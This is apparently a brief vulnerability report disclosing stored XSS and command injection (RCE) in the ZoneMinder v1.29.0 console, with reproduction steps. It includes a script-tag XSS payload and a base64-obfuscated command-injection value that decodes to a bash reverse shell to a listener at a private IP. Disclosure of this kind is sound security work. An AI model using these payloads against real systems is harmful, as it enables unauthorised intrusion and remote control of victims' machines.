# Stored XSS and RCE in ZoneMinder console v1.29.0

Not sure if this has been reported elsewhere, other vulnerabilities are similar but not the same (e.g. CVE-2023-26035 - Involves injecting in the Monitor ID while creating a snapshot, [ExploitDB](https://www.exploit-db.com/exploits/41239) - Involves reflected XSS, not stored)

# To reproduce
In a ZoneMinder installation.
## XSS
- Go to /index.php?view=options&tab=web
- Set WEB_TITLE_PREFIX to ZM </title><script>alert(1)</script>
- Save
- Visit any page and confirm the alert appears.

## RCE
- Press Add New Monitor
- In the Device set device ID to `;[COMMAND];#`
- E.g. `;echo 'YmFzaCAtaSA+JiAvZGV2L3RjcC8xOTIuMTY4LjQ1LjE4Ny84MCAwPiYxCg=='|base64 -d|bash;#`
